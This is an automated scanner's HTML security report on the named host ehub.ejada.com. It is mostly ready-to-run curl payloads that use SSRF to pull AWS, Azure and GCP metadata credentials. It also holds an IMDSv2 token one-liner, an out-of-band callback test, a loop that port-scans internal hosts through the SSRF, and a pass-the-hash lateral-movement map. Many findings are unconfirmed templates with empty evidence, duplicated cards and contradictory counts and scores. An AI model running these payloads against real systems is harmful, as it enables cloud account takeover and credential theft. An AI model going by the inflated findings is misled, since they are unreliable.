@@ -1,0 +1,2035 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
+<title>APEX_HUNTER — ehub.ejada.com — 20260601_020947</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#0d1117;color:#c9d1d9;font-family:'Segoe UI',monospace;font-size:14px}
+h1,h2{color:#58a6ff} h3{color:#79c0ff;margin:12px 0 6px}
+.wrap{max-width:1400px;margin:0 auto;padding:20px}
+.hdr{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:20px;margin-bottom:20px}
+.stats{display:flex;gap:12px;flex-wrap:wrap;margin:16px 0}
+.stat{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:12px 22px;text-align:center}
+.stat .num{font-size:2em;font-weight:bold}
+.card{background:#161b22;border:1px solid #30363d;border-radius:8px;margin:12px 0;overflow:hidden}
+.card-hdr{padding:10px 14px;background:#1c2128;display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+.card-body{padding:14px}
+.badge{padding:2px 8px;border-radius:4px;color:#fff;font-size:11px;font-weight:bold}
+pre{background:#0d1117;border:1px solid #30363d;padding:8px;border-radius:4px;overflow-x:auto;margin:6px 0}
+code{font-size:12px}
+.meta{color:#8b949e;margin-bottom:8px}
+.fix{background:#162032;border-left:3px solid #17a2b8;padding:6px;border-radius:2px;margin-top:8px}
+table{width:100%;border-collapse:collapse;margin:12px 0}
+th{background:#1c2128;padding:8px;text-align:left;border:1px solid #30363d;color:#79c0ff}
+td{padding:8px;border:1px solid #30363d}
+.filters{margin:12px 0}
+.btn{padding:5px 12px;border-radius:4px;border:1px solid #30363d;background:#161b22;color:#c9d1d9;cursor:pointer;margin:2px}
+.btn:hover,.btn.active{background:#58a6ff;color:#000}
+</style></head><body><div class="wrap">
+<div class="hdr"><h1>&#x1F6E1; APEX_HUNTER v1.0 — ehub.ejada.com</h1>
+<p style="color:#8b949e;margin-top:8px">Generated: 2026-06-01 02:30:47 &nbsp;|&nbsp; 360 Tools &nbsp;|&nbsp; 370 Skills &nbsp;|&nbsp; Folder: ehub.ejada.com_20260601_020947</p></div>
+<div class="stats"><div class="stat"><div class="num" style="color:#dc3545">21</div>CRITICAL</div><div class="stat"><div class="num" style="color:#fd7e14">31</div>HIGH</div><div class="stat"><div class="num" style="color:#ffc107">41</div>MEDIUM</div><div class="stat"><div class="num" style="color:#17a2b8">0</div>LOW</div><div class="stat"><div class="num" style="color:#6c757d">20</div>INFO</div><div class="stat"><div class="num" style="color:#58a6ff">113</div>TOTAL</div></div>
+<h2>Infrastructure</h2>
+<table><tr><th>Host</th><th>IP</th><th>Provider</th><th>TLS</th><th>WAF/CDN</th><th>Headers</th><th>Findings</th></tr><tr><td>ehub.ejada.com</td><td>34.111.193.103</td><td>Unknown</td><td>TLSv1.3</td><td>None</td><td>0/100</td><td>113</td></tr></table>
+<h2>Findings (113)</h2>
+<div class="filters"><button class="btn" onclick="filter('ALL')">ALL</button><button class="btn" onclick="filter('CRITICAL')">CRITICAL</button><button class="btn" onclick="filter('HIGH')">HIGH</button><button class="btn" onclick="filter('MEDIUM')">MEDIUM</button><button class="btn" onclick="filter('LOW')">LOW</button><button class="btn" onclick="filter('INFO')">INFO</button></div>
+<div id="fc">
+<div class="card" data-sev="CRITICAL">
+  <div class="card-hdr" style="border-left:4px solid #dc3545">
+    <span class="badge" style="background:#dc3545">CRITICAL</span>
+    <b>FULL-CHAIN-POC</b> — Full chain PoC — 5 findings chained, 2 attack combos identified
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-1035 &nbsp;|&nbsp; CVSS: 10.0 &nbsp;|&nbsp; Exploit Chain</div>
+    <p>Top-5 findings exploit chain for ehub.ejada.com:
+Step 1: [HIGH] Critical Security Headers Missing
+  PoC: curl -sI &#x27;https://ehub.ejada.com/&#x27;
+Step 2: [MEDIUM] Clickjacking Vulnerability
+  PoC: curl -sI &#x27;https://ehub.ejada.com/&#x27; | grep -i &#x27;x-frame\|frame-ancestors&#x27;
+Step 3: [MEDIUM] Dangling DNS — blog.ejada.com does not resolve
+  PoC: dig blog.ejada.com +short
+Step 4: [MEDIUM] Dangling DNS — help.ejada.com does not resolve
+  PoC: dig help.ejada.com +short
+Step 5: [MEDIUM] Dangling DNS — support.ejada.com does not resolve
+  PoC: dig support.ejada.com +short
+
+Attack combos:
+  [CHAIN] SSRF to Cloud Metadata = IAM credential theft (CRITICAL)
+  [CHAIN] Subdomain Takeover → CSP bypass → XSS (HIGH)</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sI &#x27;https://ehub.ejada.com/&#x27;
+curl -sI &#x27;https://ehub.ejada.com/&#x27; | grep -i &#x27;x-frame\|frame-ancestors&#x27;
+dig blog.ejada.com +short
+dig help.ejada.com +short
+dig support.ejada.com +short</code></pre>
+    <div class="fix">Fix: Address CRITICAL and HIGH findings first. Prioritise the chains above as they represent real attack scenarios.</div>
+  </div>
+</div>
+<div class="card" data-sev="CRITICAL">
+  <div class="card-hdr" style="border-left:4px solid #dc3545">
+    <span class="badge" style="background:#dc3545">CRITICAL</span>
+    <b>ADV-EXPLOIT-CHAIN</b> — Advanced exploit chain: SSRF → Cloud Metadata → IAM Key Exfiltration → Full AWS Takeover
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-1035 &nbsp;|&nbsp; CVSS: 10.0 &nbsp;|&nbsp; Exploit Chain</div>
+    <p>Attack chains synthesised for ehub.ejada.com (2 chains, 49 findings):
+
+[CRITICAL] SSRF → Cloud Metadata → IAM Key Exfiltration → Full AWS Takeover
+  Narrative: 1. SSRF fetches http://169.254.169.254/  2. IAM role credentials returned  3. aws configure + enumerate S3/EC2/Lambda  4. Lateral movement to production infra
+
+[CRITICAL] SSTI Expression Evaluation → OS Command Execution → Server Takeover
+  Narrative: 1. Inject {{7*7}} → 49  2. Escalate to Jinja2 class traversal payload  3. os.popen(&#x27;id&#x27;)  4. Reverse shell</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>Step 1: curl -sI &#x27;https://ehub.ejada.com/&#x27;
+curl -sI &#x27;https://ehub.ejada.com/&#x27; | grep -i &#x27;x-frame\|frame-ance
+Step 2: curl -sI &#x27;https://ehub.ejada.com/&#x27;
+Step 3: curl -sI &#x27;https://ehub.ejada.com/&#x27; | grep -i &#x27;x-frame\|frame-ancestors&#x27;
+Step 4: dig blog.ejada.com +short
+Step 5: dig help.ejada.com +short</code></pre>
+    <div class="fix">Fix: Remediate CRITICAL findings first — especially any chain anchor (SSRF, SSTI, Deserialisation, LFI). Each individual fix breaks the chain.</div>
+  </div>
+</div>
+<div class="card" data-sev="CRITICAL">
+  <div class="card-hdr" style="border-left:4px solid #dc3545">
+    <span class="badge" style="background:#dc3545">CRITICAL</span>
+    <b>AZURE-IMDS-V1-METADATA-URL</b> — SSRF → Azure IMDS v1-metadata Chain via ?url
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-918 &nbsp;|&nbsp; CVSS: 9.9 &nbsp;|&nbsp; SSRF → Cloud Pivot</div>
+    <p>If SSRF confirmed via ?url, inject Azure IMDS endpoint (v1-metadata) to retrieve managed identity access token granting full Azure control plane access (subscription, Key Vault, Storage).</p>
+    <b>Evidence:</b><pre><code>SSRF URL: https://ehub.ejada.com?url=http%3A//169.254.169.254/metadata/instance%3Fapi-version%3D2021-02-01
+IMDS Target: http://169.254.169.254/metadata/instance?api-version=2021-02-01
+Expected response: {&quot;access_token&quot;: &quot;eyJ0eXAiOiJKV1QiLCJhbGci...&quot;}</code></pre>
+    <b>PoC (curl):</b><pre><code># Step 1 — Verify SSRF via OOB:
+curl -sk &#x27;https://ehub.ejada.com?url=http://YOUR_OOB_DOMAIN.burpcollaborator.net/&#x27;
+# Step 2 — Exploit via Azure IMDS:
+curl -sk &#x27;https://ehub.ejada.com?url=http%3A//169.254.169.254/metadata/instance%3Fapi-version%3D2021-02-01&#x27; -H &#x27;Metadata: true&#x27;</code></pre>
+    <div class="fix">Fix: Block IMDS at network layer (SSRF egress filtering). Use IMDSv2 with PUT token. Apply outbound firewall rules blocking 169.254.169.254.</div>
+  </div>
+</div>
+<div class="card" data-sev="CRITICAL">
+  <div class="card-hdr" style="border-left:4px solid #dc3545">
+    <span class="badge" style="background:#dc3545">CRITICAL</span>
+    <b>AZURE-IMDS-V1-IDENTITY-URL</b> — SSRF → Azure IMDS v1-identity Chain via ?url
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-918 &nbsp;|&nbsp; CVSS: 9.9 &nbsp;|&nbsp; SSRF → Cloud Pivot</div>
+    <p>If SSRF confirmed via ?url, inject Azure IMDS endpoint (v1-identity) to retrieve managed identity access token granting full Azure control plane access (subscription, Key Vault, Storage).</p>
+    <b>Evidence:</b><pre><code>SSRF URL: https://ehub.ejada.com?url=http%3A//169.254.169.254/metadata/identity/oauth2/token%3Fapi-version%3D2018-02-01%26resource%3Dhttps%3A//management.azure.com/
+IMDS Target: http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/
+Expected response: {&quot;access_token&quot;: &quot;eyJ0eXAiOiJKV1QiLCJhbGci...&quot;}</code></pre>
+    <b>PoC (curl):</b><pre><code># Step 1 — Verify SSRF via OOB:
+curl -sk &#x27;https://ehub.ejada.com?url=http://YOUR_OOB_DOMAIN.burpcollaborator.net/&#x27;
+# Step 2 — Exploit via Azure IMDS:
+curl -sk &#x27;https://ehub.ejada.com?url=http%3A//169.254.169.254/metadata/identity/oauth2/token%3Fapi-version%3D2018-02-01%26resource%3Dhttps%3A//management.azure.com/&#x27; -H &#x27;Metadata: true&#x27;</code></pre>
+    <div class="fix">Fix: Block IMDS at network layer (SSRF egress filtering). Use IMDSv2 with PUT token. Apply outbound firewall rules blocking 169.254.169.254.</div>
+  </div>
+</div>
+<div class="card" data-sev="CRITICAL">
+  <div class="card-hdr" style="border-left:4px solid #dc3545">
+    <span class="badge" style="background:#dc3545">CRITICAL</span>
+    <b>AZURE-IMDS-V1-SUBSCRIPTIO-URL</b> — SSRF → Azure IMDS v1-subscription Chain via ?url
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-918 &nbsp;|&nbsp; CVSS: 9.9 &nbsp;|&nbsp; SSRF → Cloud Pivot</div>
+    <p>If SSRF confirmed via ?url, inject Azure IMDS endpoint (v1-subscription) to retrieve managed identity access token granting full Azure control plane access (subscription, Key Vault, Storage).</p>
+    <b>Evidence:</b><pre><code>SSRF URL: https://ehub.ejada.com?url=http%3A//169.254.169.254/metadata/instance/compute/subscriptionId%3Fapi-version%3D2021-02-01%26format%3Dtext
+IMDS Target: http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01&amp;format=text
+Expected response: {&quot;access_token&quot;: &quot;eyJ0eXAiOiJKV1QiLCJhbGci...&quot;}</code></pre>
+    <b>PoC (curl):</b><pre><code># Step 1 — Verify SSRF via OOB:
+curl -sk &#x27;https://ehub.ejada.com?url=http://YOUR_OOB_DOMAIN.burpcollaborator.net/&#x27;
+# Step 2 — Exploit via Azure IMDS:
+curl -sk &#x27;https://ehub.ejada.com?url=http%3A//169.254.169.254/metadata/instance/compute/subscriptionId%3Fapi-version%3D2021-02-01%26format%3Dtext&#x27; -H &#x27;Metadata: true&#x27;</code></pre>
+    <div class="fix">Fix: Block IMDS at network layer (SSRF egress filtering). Use IMDSv2 with PUT token. Apply outbound firewall rules blocking 169.254.169.254.</div>
+  </div>
+</div>
+<div class="card" data-sev="CRITICAL">
+  <div class="card-hdr" style="border-left:4px solid #dc3545">
+    <span class="badge" style="background:#dc3545">CRITICAL</span>
+    <b>AZURE-IMDS-V2-IDENTITY-URL</b> — SSRF → Azure IMDS v2-identity Chain via ?url
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-918 &nbsp;|&nbsp; CVSS: 9.9 &nbsp;|&nbsp; SSRF → Cloud Pivot</div>
+    <p>If SSRF confirmed via ?url, inject Azure IMDS endpoint (v2-identity) to retrieve managed identity access token granting full Azure control plane access (subscription, Key Vault, Storage).</p>
+    <b>Evidence:</b><pre><code>SSRF URL: https://ehub.ejada.com?url=http%3A//169.254.169.254/metadata/identity/oauth2/token%3Fapi-version%3D2019-11-01%26resource%3Dhttps%3A//vault.azure.net
+IMDS Target: http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-11-01&amp;resource=https://vault.azure.net
+Expected response: {&quot;access_token&quot;: &quot;eyJ0eXAiOiJKV1QiLCJhbGci...&quot;}</code></pre>
+    <b>PoC (curl):</b><pre><code># Step 1 — Verify SSRF via OOB:
+curl -sk &#x27;https://ehub.ejada.com?url=http://YOUR_OOB_DOMAIN.burpcollaborator.net/&#x27;
+# Step 2 — Exploit via Azure IMDS:
+curl -sk &#x27;https://ehub.ejada.com?url=http%3A//169.254.169.254/metadata/identity/oauth2/token%3Fapi-version%3D2019-11-01%26resource%3Dhttps%3A//vault.azure.net&#x27; -H &#x27;Metadata: true&#x27;</code></pre>
+    <div class="fix">Fix: Block IMDS at network layer (SSRF egress filtering). Use IMDSv2 with PUT token. Apply outbound firewall rules blocking 169.254.169.254.</div>
+  </div>
+</div>
+<div class="card" data-sev="CRITICAL">
+  <div class="card-hdr" style="border-left:4px solid #dc3545">
+    <span class="badge" style="background:#dc3545">CRITICAL</span>
+    <b>AWS-IMDS-V1-CREDS</b> — SSRF → AWS IMDS v1-creds — IAM Credential Theft Chain
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-918 &nbsp;|&nbsp; CVSS: 9.9 &nbsp;|&nbsp; SSRF → Cloud Pivot</div>
+    <p>If SSRF confirmed, inject AWS IMDS endpoint (v1-creds) to retrieve IAM role credentials (AccessKeyId, SecretAccessKey, Token) granting full AWS API access. Combine with IMDSv2 X-aws-ec2-metadata-token bypass.</p>
+    <b>Evidence:</b><pre><code>Target: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+Step 1 — Get role name: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+Step 2 — Get creds: http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
+Step 3 — Use creds: aws sts get-caller-identity --profile stolen</code></pre>
+    <b>PoC (curl):</b><pre><code># IMDSv1 (no token required):
+curl -sk &#x27;https://ehub.ejada.com?url=http%3A//169.254.169.254/latest/meta-data/iam/security-credentials/&#x27;
+# IMDSv2 bypass (PUT token first):
+TOKEN=$(curl -sk -X PUT -H &#x27;X-aws-ec2-metadata-token-ttl-seconds: 21600&#x27; &#x27;http://169.254.169.254/latest/api/token&#x27;) &amp;&amp; curl -sk -H &quot;X-aws-ec2-metadata-token: $TOKEN&quot; &#x27;http://169.254.169.254/latest/meta-data/iam/security-credentials/&#x27;</code></pre>
+    <div class="fix">Fix: Block 169.254.169.254 in egress firewall rules. Enforce IMDSv2 (require token). Apply least-privilege IAM roles. Use VPC endpoint policies.</div>
+  </div>
+</div>
+<div class="card" data-sev="CRITICAL">
+  <div class="card-hdr" style="border-left:4px solid #dc3545">
+    <span class="badge" style="background:#dc3545">CRITICAL</span>
+    <b>AWS-IMDS-V1-ROLE</b> — SSRF → AWS IMDS v1-role — IAM Credential Theft Chain
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-918 &nbsp;|&nbsp; CVSS: 9.9 &nbsp;|&nbsp; SSRF → Cloud Pivot</div>
+    <p>If SSRF confirmed, inject AWS IMDS endpoint (v1-role) to retrieve IAM role credentials (AccessKeyId, SecretAccessKey, Token) granting full AWS API access. Combine with IMDSv2 X-aws-ec2-metadata-token bypass.</p>
+    <b>Evidence:</b><pre><code>Target: http://169.254.169.254/latest/meta-data/iam/info
+Step 1 — Get role name: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+Step 2 — Get creds: http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
+Step 3 — Use creds: aws sts get-caller-identity --profile stolen</code></pre>
+    <b>PoC (curl):</b><pre><code># IMDSv1 (no token required):
+curl -sk &#x27;https://ehub.ejada.com?url=http%3A//169.254.169.254/latest/meta-data/iam/info&#x27;
+# IMDSv2 bypass (PUT token first):
+TOKEN=$(curl -sk -X PUT -H &#x27;X-aws-ec2-metadata-token-ttl-seconds: 21600&#x27; &#x27;http://169.254.169.254/latest/api/token&#x27;) &amp;&amp; curl -sk -H &quot;X-aws-ec2-metadata-token: $TOKEN&quot; &#x27;http://169.254.169.254/latest/meta-data/iam/security-credentials/&#x27;</code></pre>
+    <div class="fix">Fix: Block 169.254.169.254 in egress firewall rules. Enforce IMDSv2 (require token). Apply least-privilege IAM roles. Use VPC endpoint policies.</div>
+  </div>
+</div>
+<div class="card" data-sev="CRITICAL">
+  <div class="card-hdr" style="border-left:4px solid #dc3545">
+    <span class="badge" style="background:#dc3545">CRITICAL</span>
+    <b>AWS-IMDS-V2-TOKEN</b> — SSRF → AWS IMDS v2-token — IAM Credential Theft Chain
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-918 &nbsp;|&nbsp; CVSS: 9.9 &nbsp;|&nbsp; SSRF → Cloud Pivot</div>
+    <p>If SSRF confirmed, inject AWS IMDS endpoint (v2-token) to retrieve IAM role credentials (AccessKeyId, SecretAccessKey, Token) granting full AWS API access. Combine with IMDSv2 X-aws-ec2-metadata-token bypass.</p>
+    <b>Evidence:</b><pre><code>Target: http://169.254.169.254/latest/api/token
+Step 1 — Get role name: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+Step 2 — Get creds: http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
+Step 3 — Use creds: aws sts get-caller-identity --profile stolen</code></pre>
+    <b>PoC (curl):</b><pre><code># IMDSv1 (no token required):
+curl -sk &#x27;https://ehub.ejada.com?url=http%3A//169.254.169.254/latest/api/token&#x27;
+# IMDSv2 bypass (PUT token first):
+TOKEN=$(curl -sk -X PUT -H &#x27;X-aws-ec2-metadata-token-ttl-seconds: 21600&#x27; &#x27;http://169.254.169.254/latest/api/token&#x27;) &amp;&amp; curl -sk -H &quot;X-aws-ec2-metadata-token: $TOKEN&quot; &#x27;http://169.254.169.254/latest/meta-data/iam/security-credentials/&#x27;</code></pre>
+    <div class="fix">Fix: Block 169.254.169.254 in egress firewall rules. Enforce IMDSv2 (require token). Apply least-privilege IAM roles. Use VPC endpoint policies.</div>
+  </div>
+</div>
+<div class="card" data-sev="CRITICAL">
+  <div class="card-hdr" style="border-left:4px solid #dc3545">
+    <span class="badge" style="background:#dc3545">CRITICAL</span>
+    <b>GCP-META-SA-TOKEN</b> — SSRF → GCP Metadata sa-token — Service Account Token Chain
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-918 &nbsp;|&nbsp; CVSS: 9.9 &nbsp;|&nbsp; SSRF → Cloud Pivot</div>
+    <p>If SSRF confirmed, inject GCP metadata endpoint (sa-token) to retrieve OAuth2 access_token for the instance service account. Token grants GCP API access to Cloud Storage, GKE, BigQuery, etc.</p>
+    <b>Evidence:</b><pre><code>Metadata Target: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+Required header: Metadata-Flavor: Google
+Expected: {&quot;access_token&quot;: &quot;ya29.xxx&quot;, &quot;token_type&quot;: &quot;Bearer&quot;}</code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk &#x27;https://ehub.ejada.com?url=http%3A//metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token&#x27; -H &#x27;Metadata-Flavor: Google&#x27;
+# Or direct if host has SSRF:
+curl -sk &#x27;http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token&#x27; -H &#x27;Metadata-Flavor: Google&#x27;</code></pre>
+    <div class="fix">Fix: Block metadata.google.internal and 169.254.169.254 in egress. Use Workload Identity Federation instead of service account keys. Apply metadata server access controls.</div>
+  </div>
+</div>
+<div class="card" data-sev="CRITICAL">
+  <div class="card-hdr" style="border-left:4px solid #dc3545">
+    <span class="badge" style="background:#dc3545">CRITICAL</span>
+    <b>GCP-META-SA-EMAIL</b> — SSRF → GCP Metadata sa-email — Service Account Token Chain
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-918 &nbsp;|&nbsp; CVSS: 9.9 &nbsp;|&nbsp; SSRF → Cloud Pivot</div>
+    <p>If SSRF confirmed, inject GCP metadata endpoint (sa-email) to retrieve OAuth2 access_token for the instance service account. Token grants GCP API access to Cloud Storage, GKE, BigQuery, etc.</p>
+    <b>Evidence:</b><pre><code>Metadata Target: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
+Required header: Metadata-Flavor: Google
+Expected: {&quot;access_token&quot;: &quot;ya29.xxx&quot;, &quot;token_type&quot;: &quot;Bearer&quot;}</code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk &#x27;https://ehub.ejada.com?url=http%3A//metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email&#x27; -H &#x27;Metadata-Flavor: Google&#x27;
+# Or direct if host has SSRF:
+curl -sk &#x27;http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email&#x27; -H &#x27;Metadata-Flavor: Google&#x27;</code></pre>
+    <div class="fix">Fix: Block metadata.google.internal and 169.254.169.254 in egress. Use Workload Identity Federation instead of service account keys. Apply metadata server access controls.</div>
+  </div>
+</div>
+<div class="card" data-sev="CRITICAL">
+  <div class="card-hdr" style="border-left:4px solid #dc3545">
+    <span class="badge" style="background:#dc3545">CRITICAL</span>
+    <b>GCP-META-PROJECT-ID</b> — SSRF → GCP Metadata project-id — Service Account Token Chain
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-918 &nbsp;|&nbsp; CVSS: 9.9 &nbsp;|&nbsp; SSRF → Cloud Pivot</div>
+    <p>If SSRF confirmed, inject GCP metadata endpoint (project-id) to retrieve OAuth2 access_token for the instance service account. Token grants GCP API access to Cloud Storage, GKE, BigQuery, etc.</p>
+    <b>Evidence:</b><pre><code>Metadata Target: http://metadata.google.internal/computeMetadata/v1/project/project-id
+Required header: Metadata-Flavor: Google
+Expected: {&quot;access_token&quot;: &quot;ya29.xxx&quot;, &quot;token_type&quot;: &quot;Bearer&quot;}</code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk &#x27;https://ehub.ejada.com?url=http%3A//metadata.google.internal/computeMetadata/v1/project/project-id&#x27; -H &#x27;Metadata-Flavor: Google&#x27;
+# Or direct if host has SSRF:
+curl -sk &#x27;http://metadata.google.internal/computeMetadata/v1/project/project-id&#x27; -H &#x27;Metadata-Flavor: Google&#x27;</code></pre>
+    <div class="fix">Fix: Block metadata.google.internal and 169.254.169.254 in egress. Use Workload Identity Federation instead of service account keys. Apply metadata server access controls.</div>
+  </div>
+</div>
+<div class="card" data-sev="CRITICAL">
+  <div class="card-hdr" style="border-left:4px solid #dc3545">
+    <span class="badge" style="background:#dc3545">CRITICAL</span>
+    <b>CHAIN-CLOUD-TAKEOVER</b> — [EXPLOIT CHAIN] Cloud Account Takeover via SSRF
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-693 &nbsp;|&nbsp; CVSS: 9.9 &nbsp;|&nbsp; Exploit Chain</div>
+    <p>[APPLICABLE TO THIS TARGET] Complete exploit narrative: Cloud Account Takeover via SSRF
+
+Attack steps:
+1. Identify SSRF-capable parameter via OOB DNS callback
+2. Pivot to cloud IMDS (169.254.169.254 or metadata.google.internal)
+3. Extract managed identity / IAM role credentials
+4. Authenticate to cloud API (aws sts, az account, gcloud auth)
+5. Enumerate IAM permissions, storage buckets, secrets
+6. Exfiltrate data, escalate to admin, deploy backdoor Lambda/Function
+
+Impact: Full cloud account compromise, data exfiltration, persistence</p>
+    <b>Evidence:</b><pre><code>Applicable to target: True | CVSS: 9.9</code></pre>
+    <b>PoC (curl):</b><pre><code># See attack steps above — each step must be verified manually</code></pre>
+    <div class="fix">Fix: Address all prerequisite vulnerabilities. Implement defence-in-depth: WAF, egress filtering, least privilege, network segmentation, SIEM alerting.</div>
+  </div>
+</div>
+<div class="card" data-sev="CRITICAL">
+  <div class="card-hdr" style="border-left:4px solid #dc3545">
+    <span class="badge" style="background:#dc3545">CRITICAL</span>
+    <b>SCORECARD-001</b> — Attack Surface Scorecard — Risk Score 539/500 (100%) — CRITICAL
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-693 &nbsp;|&nbsp; CVSS: 0.0 &nbsp;|&nbsp; Risk Scorecard</div>
+    <p>Attack Surface Scorecard — ehub.ejada.com
+══════════════════════════════════════════════════
+Risk Score    : 539 / 500 (100%)
+Risk Band     : CRITICAL — Immediate remediation required
+
+Finding Distribution:
+  CRITICAL   :   13 █████████████
+  HIGH       :    5 █████
+  MEDIUM     :   41 ████████████████████████████████████████
+  LOW        :    0 
+  INFO       :    9 █████████
+
+Top Attack Categories:
+  Information Disclosure                   : 26
+  SSRF → Cloud Pivot                       : 10
+  Subdomain Takeover                       : 7
+  Exploit Chain                            : 7
+  GraphQL                                  : 4
+  SSRF                                     : 3
+  RCE                                      : 2
+  Security Headers                         : 1
+  Clickjacking                             : 1
+  VDP                                      : 1
+
+Remediation Priority Matrix:
+  Priority 1 (Immediate): All CRITICAL findings
+  Priority 2 (7 days):    All HIGH findings
+  Priority 3 (30 days):   All MEDIUM findings
+  Priority 4 (90 days):   All LOW findings</p>
+    <b>Evidence:</b><pre><code>Total findings: 68 | Weighted score: 539/500</code></pre>
+    <b>PoC (curl):</b><pre><code># This is a summary scorecard — see individual findings for PoC commands</code></pre>
+    <div class="fix">Fix: Use this scorecard to prioritise remediation. Share with development team and security leadership. Re-scan after fixes to verify remediation effectiveness.</div>
+  </div>
+</div>
+<div class="card" data-sev="CRITICAL">
+  <div class="card-hdr" style="border-left:4px solid #dc3545">
+    <span class="badge" style="background:#dc3545">CRITICAL</span>
+    <b>SCORECARD-001</b> — Attack Surface Scorecard — Risk Score 564/500 (100%) — CRITICAL
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-693 &nbsp;|&nbsp; CVSS: 0.0 &nbsp;|&nbsp; Risk Scorecard</div>
+    <p>Attack Surface Scorecard — ehub.ejada.com
+══════════════════════════════════════════════════
+Risk Score    : 564 / 500 (100%)
+Risk Band     : CRITICAL — Immediate remediation required
+
+Finding Distribution:
+  CRITICAL   :   14 ██████████████
+  HIGH       :    5 █████
+  MEDIUM     :   41 ████████████████████████████████████████
+  LOW        :    0 
+  INFO       :   14 ██████████████
+
+Top Attack Categories:
+  Information Disclosure                   : 26
+  SSRF → Cloud Pivot                       : 10
+  Subdomain Takeover                       : 7
+  Exploit Chain                            : 7
+  GraphQL                                  : 4
+  SSRF                                     : 3
+  Log4Shell / Java RCE                     : 3
+  RCE                                      : 2
+  DNS Exfiltration                         : 2
+  Security Headers                         : 1
+
+Remediation Priority Matrix:
+  Priority 1 (Immediate): All CRITICAL findings
+  Priority 2 (7 days):    All HIGH findings
+  Priority 3 (30 days):   All MEDIUM findings
+  Priority 4 (90 days):   All LOW findings</p>
+    <b>Evidence:</b><pre><code>Total findings: 74 | Weighted score: 564/500</code></pre>
+    <b>PoC (curl):</b><pre><code># This is a summary scorecard — see individual findings for PoC commands</code></pre>
+    <div class="fix">Fix: Use this scorecard to prioritise remediation. Share with development team and security leadership. Re-scan after fixes to verify remediation effectiveness.</div>
+  </div>
+</div>
+<div class="card" data-sev="CRITICAL">
+  <div class="card-hdr" style="border-left:4px solid #dc3545">
+    <span class="badge" style="background:#dc3545">CRITICAL</span>
+    <b>LATERAL-MOVE-MAP-001</b> — Lateral Movement Attack Path Map
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-284 &nbsp;|&nbsp; CVSS: 0.0 &nbsp;|&nbsp; Lateral Movement</div>
+    <p>Lateral movement paths from ehub.ejada.com to adjacent systems. Network segment: 34.111.193.0/24. Internal scan pivots once initial RCE/SSRF is confirmed.</p>
+    <b>Evidence:</b><pre><code>Target IP: 34.111.193.103
+Network: 34.111.193.0/24
+
+Pivot Paths:
+  → SSH             ports [22] : Stolen SSH key / password spraying
+  → RDP             ports [3389, 3390] : Pass-the-hash via NTLM, credential reuse
+  → SMB             ports [445, 139] : Pass-the-hash, lateral tool execution
+  → WinRM           ports [5985, 5986] : Invoke-Command / Evil-WinRM with stolen creds
+  → MySQL           ports [3306] : Credential reuse from leaked .env/config
+  → PostgreSQL      ports [5432] : Credential</code></pre>
+    <b>PoC (curl):</b><pre><code># Internal port scan via SSRF (interactsh):
+for port in 22 80 443 3306 5432 6379 8080 8443 9200; do
+  curl -sk &#x27;https://ehub.ejada.com/?url=http://10.0.0.1:$port/&#x27; 2&gt;&amp;1 |   grep -v &#x27;refused\|timed&#x27; &amp;&amp; echo &quot;OPEN: $port&quot;
+done</code></pre>
+    <div class="fix">Fix: Implement network segmentation. Use jump hosts for internal access. Apply micro-segmentation. Monitor east-west traffic. Rotate all credentials that may have been exposed.</div>
+  </div>
+</div>
+<div class="card" data-sev="CRITICAL">
+  <div class="card-hdr" style="border-left:4px solid #dc3545">
+    <span class="badge" style="background:#dc3545">CRITICAL</span>
+    <b>LATERAL-MOVE-MAP-001</b> — Lateral Movement Attack Path Map
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-284 &nbsp;|&nbsp; CVSS: 0.0 &nbsp;|&nbsp; Lateral Movement</div>
+    <p>Lateral movement paths from ehub.ejada.com to adjacent systems. Network segment: 34.111.193.0/24. Internal scan pivots once initial RCE/SSRF is confirmed.</p>
+    <b>Evidence:</b><pre><code>Target IP: 34.111.193.103
+Network: 34.111.193.0/24
+
+Pivot Paths:
+  → SSH             ports [22] : Stolen SSH key / password spraying
+  → RDP             ports [3389, 3390] : Pass-the-hash via NTLM, credential reuse
